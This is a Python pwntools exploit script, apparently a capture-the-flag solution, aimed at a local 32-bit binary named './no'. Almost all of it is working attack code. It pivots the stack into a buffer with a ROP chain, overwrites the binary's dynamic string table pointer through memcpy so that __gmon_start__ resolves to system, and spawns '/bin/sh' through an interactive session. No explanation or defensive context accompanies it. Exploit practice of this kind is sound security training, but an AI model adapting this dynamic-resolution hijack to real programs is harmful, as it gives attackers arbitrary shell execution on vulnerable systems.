#!/usr/bin/env python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./no')
elf = ELF('./no')

read_plt = elf.plt['read']
memcpy_plt = elf.plt['memcpy']
gmon_start_plt = elf.plt['__gmon_start__']
plt0 = 0x80482e0

buf = 0x8049740
# 0x080482d5 : pop ebx ; ret
# 0x080484de : pop edi ; pop ebp ; ret
# 0x080484dd : pop esi ; pop edi ; pop ebp ; ret
pop1_ret = 0x080482d5
pop2_ret = 0x080484de
pop3_ret = 0x080484dd

# readelf -a ./no | grep .dynamic
#   [21] .dynamic          DYNAMIC         08049604 000604 0000e8 08  WA  6   0  4
dynamic = 0x08049604
dynstr_addr = dynamic + 8 * 8

#gdb.attach(p, 'b *0x804847a\nc')

def memcpy(dst, src, length):
	return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)

st_name = 0x38
payload = (
	((
		'A' * 18 + # padding
		p32(buf + 1024 + 4) # set esp=buf+1024
	).ljust(1024, '\x00') + # buf+1024
		memcpy(dynstr_addr + 4, buf + 2048, 4) +
		p32(gmon_start_plt) +
		p32(0xdeadbeef) +
		p32(buf + 2048 + 12) # &"/bin/sh\x00"
	).ljust(2048, '\x00') +  # buf+2048
	p32(buf + 2048 + 4 - st_name) + # set strtab=&"system\x00"
	'system\x00\x00' +
	'/bin/sh\x00'
)
p.sendline(payload)

p.interactive()

